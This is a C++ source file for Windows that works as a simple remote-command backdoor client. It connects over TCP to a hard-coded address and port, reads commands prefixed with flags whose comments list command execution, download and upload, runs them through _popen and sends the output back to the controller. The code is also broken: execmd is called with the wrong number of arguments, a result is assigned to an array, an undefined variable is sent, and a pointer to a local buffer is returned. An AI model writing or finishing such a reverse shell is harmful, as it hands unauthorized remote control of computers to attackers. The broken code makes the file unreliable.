// test002.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
//#include <windows.h>
#pragma comment (lib, "ws2_32.lib")
#define BUFFSIZE 1024
#define IPADDR "127.0.0.1"
#define PORT 12345


char* execmd(char *args);

char* execmd(char *cmd)
{
	FILE * fp;
	char buffer[128];
    //buffer
	char result[BUFFSIZE * 10] = {0};
    //result buffer
    char zeroarry[BUFFSIZE * 10] = {0};
    //null arry
	char *err = "[!]execute error..."; 
    //error info 
	fp = _popen(cmd, "r");
    //only return stdout handle,and error handle can't return....
	if (!fp) {
		return err;
	}
	while (!feof(fp)) {
		if (fgets(buffer, 128, fp)) {
			strcat(result, buffer);
            //read result to buffer
		}
	}
    _pclose(fp);
    if (!strcmp(result,zeroarry)){
        return err;
        //if execute wrong,result will be black,so return error info
    }else{     
	    return result;
        //execute cmd sussess return result string 
    }


}
int main(int argc, char const *argv[])

{
	char s[BUFFSIZE] = { 0 };
	char flag[5] = { 0 };
	char cmd[BUFFSIZE] = { 0 };
    char res[BUFFSIZE * 10] = {0};
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKADDR_IN addrs;
	memset(&addrs, 0, sizeof(addrs));
	addrs.sin_family = PF_INET;
	addrs.sin_addr.s_addr = inet_addr(IPADDR);
	addrs.sin_port = htons(PORT);
	connect(sock, (SOCKADDR*)&addrs, sizeof(SOCKADDR));
	while (1) {
		ZeroMemory(cmd, sizeof(cmd));
		ZeroMemory(s, sizeof(s));
        //init buffer
		recv(sock, s, BUFFSIZE, NULL);
		strncpy(flag, s, 3);
        //get cmd flag,001 ==cmd,002==download,003 == upload
		strncpy(cmd, s + 3, strlen(s) - 3);
        //get args(command or file path)
		printf("[+]flag: %s\n", flag);
		printf("[+]cmd: %s\n", cmd);
		if (!strcmp(flag, "001")) {
            //if cmd flag == 001,start execute cmd function;
			res = execmd(cmd, sock);
            send(sock, result, strlen(res)+sizeof(char), 0);
		}

	}
	closesocket(sock);
	WSACleanup();
	return 0;
}
